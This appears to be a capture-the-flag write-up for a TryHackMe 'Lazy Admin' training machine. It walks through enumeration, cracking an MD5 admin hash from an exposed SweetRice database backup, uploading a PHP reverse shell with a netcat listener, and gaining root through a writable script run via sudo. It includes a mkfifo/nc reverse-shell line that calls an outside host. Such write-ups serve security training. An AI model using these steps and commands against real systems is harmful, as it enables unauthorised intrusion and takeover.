# LazyAdmin-TryHackMe

# Lazy Admin

[link to room](https://tryhackme.com/room/lazyadmin)

TASK -1 USER FLAG

## Enumeration(NMAP)
nmap -sC -sV -oN nmap MACHINE_IP
```
# Nmap 7.80 scan initiated Sun Nov 22 00:03:22 2020 as: nmap -sC -sV -oN nmap MACHINE_IP
Nmap scan report for MACHINE_IP
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 22 00:03:53 2020 -- 1 IP address (1 host up) scanned in 30.19 seconds

```
```
Open the webpage int broswer http://MACHINE_IP
```
RUN Gobuster/Dirbuster To enumerate and find hidden directories
```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
/content
```
```
Open the webpage int broswer http://MACHINE_IP/content
```
```AT MACHINE_IP/content
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```

RUN Gobuster on MACHINE_IP/content
```bash
gobuster dir -u http://lazyadmin.com/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
```
```
/inc
```
```bash
OPEN AT BROSWER MACHINE_IP/content/inc
```
```
we will see a folder named mysql_backup, navigate to mysql_backup and download the file ,open the file using any text editor.
```
```downloaded_sql_file
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:
\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"
<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p>
```
```creds
We can see that username is manager and password is hashed
```
```bash
run hash-identifier to find out hash type it is MD5
```
```bash
echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt
john hash.txt --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

```creds
We get Password
```
```bash
We find login page at MACHINE_IP/content/as in browser, Login with the username and password.
```
GOTO to media center ADS and upload the reverse shell if you dont have you can download it from the link below
[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
Change the ip the reverse shell php script to your tun0, run ifconfig to find your tun0 address
Set port of preferable choice 1234 or 443. save it and upload the file and give it a name click submit and file is uploaded at http://MACHINE_IP/content/inc/ads/yourfilename.php

open terminal and execute this
```bash
nc -lnvp portnumber_you_gave_in_script
``` 
now click on the uploaded file and spawn a shell

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```
This command is used to spawn a tty terminal, move to /home/itguy

```
cat user.txt We get the first flag. TASK-1 Completed..!!
```

TASK-2 ROOT FLAG

## Privilege Escalation


```
cat backup.pl, its a perl script
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
this script executes another script /etc/copy.sh

```bash 
cat /etc/copy.sh
```
```contents_of_copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
we cant run this..
```
```
sudo -l
we can run this : /usr/bin/perl /home/itguy/backup.pl
that is copy.sh needs to be modified for reverse shell
```
```bash
echo "/bin/bash" > /etc/copy.sh
```

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```
```bash
whoami
we are root user, navigate to root and you can find root.txt, cat it to get root flag
TASK-2 Completed..!!
```
